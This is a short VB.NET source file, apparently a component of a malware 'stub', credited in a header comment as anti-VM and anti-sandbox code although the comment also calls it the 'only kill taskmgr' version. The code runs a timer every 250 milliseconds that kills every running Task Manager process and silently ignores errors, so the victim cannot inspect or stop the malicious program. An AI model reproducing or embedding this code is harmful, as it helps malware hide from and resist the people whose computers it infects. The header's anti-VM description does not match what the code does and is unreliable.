Imports System
Imports System.Diagnostics
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
    Public Class xma

        '########################
        '#  Anti-VM + Anti-Sand #
        '#  Humoud Al-Juraid    #
        '#      @HumoudMJ       #
        '# Please Donot remove  #
        '#	    my credit       #
        '########################

        'only kill taskmgr verison

        Public Shared Sub Handler(ByVal sender As Object, ByVal e As ElapsedEventArgs)

            Dim process As Process
            For Each process In Process.GetProcessesByName("taskmgr")
                Try
                    process.Kill()
                Catch ex As Exception
                End Try
            Next




        End Sub

        Public Shared Sub Start()
            xma.xTimer = New Timer(250)
            AddHandler xma.xTimer.Elapsed, New ElapsedEventHandler(AddressOf xma.Handler)
            xma.xTimer.Enabled = True
        End Sub


        ' Fields
        Private Shared xTimer As Timer
        '' Private Shared xN As j.OK = New j.OK
    End Class
End Namespace

